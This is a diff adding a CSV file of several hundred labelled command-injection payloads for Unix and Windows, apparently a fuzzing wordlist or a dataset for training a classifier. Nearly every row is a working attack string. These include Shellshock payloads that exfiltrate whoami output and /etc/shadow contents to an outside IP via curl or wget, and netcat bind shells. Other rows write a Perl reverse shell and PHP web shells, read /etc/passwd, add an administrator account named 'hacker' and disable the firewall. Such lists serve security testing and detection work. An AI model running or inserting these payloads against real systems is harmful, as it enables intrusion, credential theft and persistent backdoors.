@@ -1,0 +1,520 @@
+value,label,description
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,Command Injection,Unix
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,Command Injection,Unix
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,Command Injection,Unix
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,Command Injection,Unix
+/index.html|id|,Command Injection,Unix
+;id;,Command Injection,Unix
+;id,Command Injection,Unix
+;netstat -a;,Command Injection,Unix
+;system('cat%20/etc/passwd'),Command Injection,Unix
+;id;,Command Injection,Unix
+|id,Command Injection,Unix
+|/usr/bin/id,Command Injection,Unix
+|id|,Command Injection,Unix
+|/usr/bin/id|,Command Injection,Unix
+||/usr/bin/id|,Command Injection,Unix
+|id;,Command Injection,Unix
+||/usr/bin/id;,Command Injection,Unix
+;id|,Command Injection,Unix
+;|/usr/bin/id|,Command Injection,Unix
+\n/bin/ls -al\n,Command Injection,Unix
+\n/usr/bin/id\n,Command Injection,Unix
+\nid\n,Command Injection,Unix
+\n/usr/bin/id;,Command Injection,Unix
+\nid;,Command Injection,Unix
+\n/usr/bin/id|,Command Injection,Unix
+\nid|,Command Injection,Unix
+;/usr/bin/id\n,Command Injection,Unix
+;id\n,Command Injection,Unix
+|usr/bin/id\n,Command Injection,Unix
+|nid\n,Command Injection,Unix
+`id`,Command Injection,Unix
+`/usr/bin/id`,Command Injection,Unix
+a);id,Command Injection,Unix
+a;id,Command Injection,Unix
+a);id;,Command Injection,Unix
+a;id;,Command Injection,Unix
+a);id|,Command Injection,Unix
+a;id|,Command Injection,Unix
+a)|id,Command Injection,Unix
+a|id,Command Injection,Unix
+a)|id;,Command Injection,Unix
+a|id,Command Injection,Unix
+|/bin/ls -al,Command Injection,Unix
+a);/usr/bin/id,Command Injection,Unix
+a;/usr/bin/id,Command Injection,Unix
+a);/usr/bin/id;,Command Injection,Unix
+a;/usr/bin/id;,Command Injection,Unix
+a);/usr/bin/id|,Command Injection,Unix
+a;/usr/bin/id|,Command Injection,Unix
+a)|/usr/bin/id,Command Injection,Unix
+a|/usr/bin/id,Command Injection,Unix
+a)|/usr/bin/id;,Command Injection,Unix
+a|/usr/bin/id,Command Injection,Unix
+;system('cat%20/etc/passwd'),Command Injection,Unix
+;system('id'),Command Injection,Unix
+;system('/usr/bin/id'),Command Injection,Unix
+%0Acat%20/etc/passwd,Command Injection,Unix
+%0A/usr/bin/id,Command Injection,Unix
+%0Aid,Command Injection,Unix
+%0A/usr/bin/id%0A,Command Injection,Unix
+%0Aid%0A,Command Injection,Unix
+& ping -i 30 127.0.0.1 &,Command Injection,Unix
+& ping -n 30 127.0.0.1 &,Command Injection,Unix
+%0a ping -i 30 127.0.0.1 %0a,Command Injection,Unix
+`ping 127.0.0.1`,Command Injection,Unix
+| id,Command Injection,Unix
+& id,Command Injection,Unix
+; id,Command Injection,Unix
+%0a id %0a,Command Injection,Unix
+`id`,Command Injection,Unix
+$;/usr/bin/id,Command Injection,Unix
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",Command Injection,Unix
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",Command Injection,Unix
+cat /etc/hosts,Command Injection,Unix
+$(`cat /etc/passwd`),Command Injection,Unix
+cat /etc/passwd,Command Injection,Unix
+%0Acat%20/etc/passwd,Command Injection,Unix
+"{{ get_user_file(""/etc/passwd"") }}",Command Injection,Unix
+"<!--#exec cmd=""/bin/cat /etc/passwd""-->",Command Injection,Unix
+"<!--#exec cmd=""/bin/cat /etc/shadow""-->",Command Injection,Unix
+"<!--#exec cmd=""/usr/bin/id;-->",Command Injection,Unix
+system('cat /etc/passwd');,Command Injection,Unix
+"<?php system(""cat /etc/passwd"");?>",Command Injection,Unix
+`,Command Injection,Windows
+|| ,Command Injection,Windows
+| ,Command Injection,Windows
+; ,Command Injection,Windows
+',Command Injection,Windows
+"'""",Command Injection,Windows
+"""",Command Injection,Windows
+"""'",Command Injection,Windows
+& ,Command Injection,Windows
+&& ,Command Injection,Windows
+%0a,Command Injection,Windows
+%0a%0d,Command Injection,Windows
+,Command Injection,Windows
+%0Aid,Command Injection,Windows
+%0a id %0a,Command Injection,Windows
+%0Aid%0A,Command Injection,Windows
+%0a ping -i 30 127.0.0.1 %0a,Command Injection,Windows
+%0A/usr/bin/id,Command Injection,Windows
+%0A/usr/bin/id%0A,Command Injection,Windows
+"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",Command Injection,Windows
+%20{${phpinfo()}},Command Injection,Windows
+%20{${sleep(20)}},Command Injection,Windows
+%20{${sleep(3)}},Command Injection,Windows
+a|id|,Command Injection,Windows
+a;id|,Command Injection,Windows
+a;id;,Command Injection,Windows
+a;id\n,Command Injection,Windows
+() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,Command Injection,Windows
+| curl http://crowdshield.com/.testing/rce.txt,Command Injection,Windows
+& curl http://crowdshield.com/.testing/rce.txt,Command Injection,Windows
+; curl https://crowdshield.com/.testing/rce_vuln.txt,Command Injection,Windows
+&& curl https://crowdshield.com/.testing/rce_vuln.txt,Command Injection,Windows
+curl https://crowdshield.com/.testing/rce_vuln.txt,Command Injection,Windows
+" curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",Command Injection,Windows
+"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",Command Injection,Windows
+$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),Command Injection,Windows
+dir,Command Injection,Windows
+| dir,Command Injection,Windows
+; dir,Command Injection,Windows
+$(`dir`),Command Injection,Windows
+& dir,Command Injection,Windows
+&&dir,Command Injection,Windows
+&& dir,Command Injection,Windows
+| dir C:\,Command Injection,Windows
+; dir C:\,Command Injection,Windows
+& dir C:\,Command Injection,Windows
+&& dir C:\,Command Injection,Windows
+dir C:\,Command Injection,Windows
+| dir C:\Documents and Settings\*,Command Injection,Windows
+; dir C:\Documents and Settings\*,Command Injection,Windows
+& dir C:\Documents and Settings\*,Command Injection,Windows
+&& dir C:\Documents and Settings\*,Command Injection,Windows
+dir C:\Documents and Settings\*,Command Injection,Windows
+| dir C:\Users,Command Injection,Windows
+; dir C:\Users,Command Injection,Windows
+& dir C:\Users,Command Injection,Windows
+&& dir C:\Users,Command Injection,Windows
+dir C:\Users,Command Injection,Windows
+;echo%20'<script>alert(1)</script>',Command Injection,Windows
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,Command Injection,Windows
+"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",Command Injection,Windows
+"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",Command Injection,Windows
+"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",Command Injection,Windows
+"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",Command Injection,Windows
+"echo ""<?php include($_GET['page']); ?>"" > rfi.php",Command Injection,Windows
+"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php ",Command Injection,Windows
+"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",Command Injection,Windows
+"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",Command Injection,Windows
+"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",Command Injection,Windows
+"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",Command Injection,Windows
+"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",Command Injection,Windows
+"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",Command Injection,Windows
+"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",Command Injection,Windows
+"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",Command Injection,Windows
+"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",Command Injection,Windows
+;echo '<script>alert(1)</script>',Command Injection,Windows
+echo '<script>alert(1)</script>'// XXXXXXXXXXX,Command Injection,Windows
+echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,Command Injection,Windows
+"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",Command Injection,Windows
+"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",Command Injection,Windows
+"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",Command Injection,Windows
+"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",Command Injection,Windows
+"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",Command Injection,Windows
+() { :;}; echo vulnerable 10,Command Injection,Windows
+eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),Command Injection,Windows
+eval('ls'),Command Injection,Windows
+eval('pwd'),Command Injection,Windows
+eval('pwd');,Command Injection,Windows
+eval('sleep 5'),Command Injection,Windows
+eval('sleep 5');,Command Injection,Windows
+eval('whoami'),Command Injection,Windows
+eval('whoami');,Command Injection,Windows
+exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),Command Injection,Windows
+exec('ls'),Command Injection,Windows
+exec('pwd'),Command Injection,Windows
+exec('pwd');,Command Injection,Windows
+exec('sleep 5'),Command Injection,Windows
+exec('sleep 5');,Command Injection,Windows
+exec('whoami'),Command Injection,Windows
+exec('whoami');,Command Injection,Windows
+";{$_GET[""cmd""]}",Command Injection,Windows
+`id`,Command Injection,Windows
+|id,Command Injection,Windows
+| id,Command Injection,Windows
+;id,Command Injection,Windows
+;id|,Command Injection,Windows
+;id;,Command Injection,Windows
+& id,Command Injection,Windows
+&&id,Command Injection,Windows
+;id\n,Command Injection,Windows
+ifconfig,Command Injection,Windows
+| ifconfig,Command Injection,Windows
+; ifconfig,Command Injection,Windows
+& ifconfig,Command Injection,Windows
+&& ifconfig,Command Injection,Windows
+/index.html|id|,Command Injection,Windows
+ipconfig,Command Injection,Windows
+| ipconfig /all,Command Injection,Windows
+; ipconfig /all,Command Injection,Windows
+& ipconfig /all,Command Injection,Windows
+&& ipconfig /all,Command Injection,Windows
+ipconfig /all,Command Injection,Windows
+ls,Command Injection,Windows
+$(`ls`),Command Injection,Windows
+| ls -l /,Command Injection,Windows
+; ls -l /,Command Injection,Windows
+& ls -l /,Command Injection,Windows
+&& ls -l /,Command Injection,Windows
+ls -l /,Command Injection,Windows
+| ls -laR /etc,Command Injection,Windows
+; ls -laR /etc,Command Injection,Windows
+& ls -laR /etc,Command Injection,Windows
+&& ls -laR /etc,Command Injection,Windows
+| ls -laR /var/www,Command Injection,Windows
+; ls -laR /var/www,Command Injection,Windows
+& ls -laR /var/www,Command Injection,Windows
+&& ls -laR /var/www,Command Injection,Windows
+| ls -l /etc/,Command Injection,Windows
+; ls -l /etc/,Command Injection,Windows
+& ls -l /etc/,Command Injection,Windows
+&& ls -l /etc/,Command Injection,Windows
+ls -l /etc/,Command Injection,Windows
+ls -lh /etc/,Command Injection,Windows
+| ls -l /home/*,Command Injection,Windows
+; ls -l /home/*,Command Injection,Windows
+& ls -l /home/*,Command Injection,Windows
+&& ls -l /home/*,Command Injection,Windows
+ls -l /home/*,Command Injection,Windows
+*; ls -lhtR /var/www/,Command Injection,Windows
+| ls -l /tmp,Command Injection,Windows
+; ls -l /tmp,Command Injection,Windows
+& ls -l /tmp,Command Injection,Windows
+&& ls -l /tmp,Command Injection,Windows
+ls -l /tmp,Command Injection,Windows
+| ls -l /var/www/*,Command Injection,Windows
+; ls -l /var/www/*,Command Injection,Windows
+& ls -l /var/www/*,Command Injection,Windows
+&& ls -l /var/www/*,Command Injection,Windows
+ls -l /var/www/*,Command Injection,Windows
+\n,Command Injection,Windows
+\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,Command Injection,Windows
+\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,Command Injection,Windows
+\n/bin/ls -al\n,Command Injection,Windows
+| nc -lvvp 4444 -e /bin/sh|,Command Injection,Windows
+; nc -lvvp 4444 -e /bin/sh;,Command Injection,Windows
+& nc -lvvp 4444 -e /bin/sh&,Command Injection,Windows
+&& nc -lvvp 4444 -e /bin/sh &,Command Injection,Windows
+nc -lvvp 4444 -e /bin/sh,Command Injection,Windows
+nc -lvvp 4445 -e /bin/sh &,Command Injection,Windows
+nc -lvvp 4446 -e /bin/sh|,Command Injection,Windows
+nc -lvvp 4447 -e /bin/sh;,Command Injection,Windows
+nc -lvvp 4448 -e /bin/sh&,Command Injection,Windows
+\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,Command Injection,Windows
+\necho INJECTX\nexit\n\033[2Asleep 5\n,Command Injection,Windows
+\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,Command Injection,Windows
+| net localgroup Administrators hacker /ADD,Command Injection,Windows
+; net localgroup Administrators hacker /ADD,Command Injection,Windows
+& net localgroup Administrators hacker /ADD,Command Injection,Windows
+&& net localgroup Administrators hacker /ADD,Command Injection,Windows
+net localgroup Administrators hacker /ADD,Command Injection,Windows
+| netsh firewall set opmode disable,Command Injection,Windows
+; netsh firewall set opmode disable,Command Injection,Windows
+& netsh firewall set opmode disable,Command Injection,Windows
+&& netsh firewall set opmode disable,Command Injection,Windows
+netsh firewall set opmode disable,Command Injection,Windows
+netstat,Command Injection,Windows
+;netstat -a;,Command Injection,Windows
+| netstat -an,Command Injection,Windows
+; netstat -an,Command Injection,Windows
+& netstat -an,Command Injection,Windows
+&& netstat -an,Command Injection,Windows
+netstat -an,Command Injection,Windows
+| net user hacker Password1 /ADD,Command Injection,Windows
+; net user hacker Password1 /ADD,Command Injection,Windows
+& net user hacker Password1 /ADD,Command Injection,Windows
+&& net user hacker Password1 /ADD,Command Injection,Windows
+net user hacker Password1 /ADD,Command Injection,Windows
+| net view,Command Injection,Windows
+; net view,Command Injection,Windows
+& net view,Command Injection,Windows
+&& net view,Command Injection,Windows
+net view,Command Injection,Windows
+\nid|,Command Injection,Windows
+\nid;,Command Injection,Windows
+\nid\n,Command Injection,Windows
+\n/usr/bin/id\n,Command Injection,Windows
+"perl -e 'print ""X""x1024'",Command Injection,Windows
+"|| perl -e 'print ""X""x16096'",Command Injection,Windows
+"| perl -e 'print ""X""x16096'",Command Injection,Windows
+"; perl -e 'print ""X""x16096'",Command Injection,Windows
+"& perl -e 'print ""X""x16096'",Command Injection,Windows
+"&& perl -e 'print ""X""x16096'",Command Injection,Windows
+"perl -e 'print ""X""x16384'",Command Injection,Windows
+"; perl -e 'print ""X""x2048'",Command Injection,Windows
+"& perl -e 'print ""X""x2048'",Command Injection,Windows
+"&& perl -e 'print ""X""x2048'",Command Injection,Windows
+"perl -e 'print ""X""x2048'",Command Injection,Windows
+"|| perl -e 'print ""X""x4096'",Command Injection,Windows
+"| perl -e 'print ""X""x4096'",Command Injection,Windows
+"; perl -e 'print ""X""x4096'",Command Injection,Windows
+"& perl -e 'print ""X""x4096'",Command Injection,Windows
+"&& perl -e 'print ""X""x4096'",Command Injection,Windows
+"perl -e 'print ""X""x4096'",Command Injection,Windows
+"|| perl -e 'print ""X""x8096'",Command Injection,Windows
+"| perl -e 'print ""X""x8096'",Command Injection,Windows
+"; perl -e 'print ""X""x8096'",Command Injection,Windows
+"&& perl -e 'print ""X""x8096'",Command Injection,Windows
+"perl -e 'print ""X""x8192'",Command Injection,Windows
+"perl -e 'print ""X""x81920'",Command Injection,Windows
+|| phpinfo(),Command Injection,Windows
+| phpinfo(),Command Injection,Windows
+ {${phpinfo()}},Command Injection,Windows
+;phpinfo(),Command Injection,Windows
+;phpinfo();//,Command Injection,Windows
+';phpinfo();//,Command Injection,Windows
+{${phpinfo()}},Command Injection,Windows
+& phpinfo(),Command Injection,Windows
+&& phpinfo(),Command Injection,Windows
+phpinfo(),Command Injection,Windows
+phpinfo();,Command Injection,Windows
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",Command Injection,Windows
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",Command Injection,Windows
+"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",Command Injection,Windows
+"<?php system(""sleep 10"");?>",Command Injection,Windows
+"<?php system(""sleep 5"");?>",Command Injection,Windows
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",Command Injection,Windows
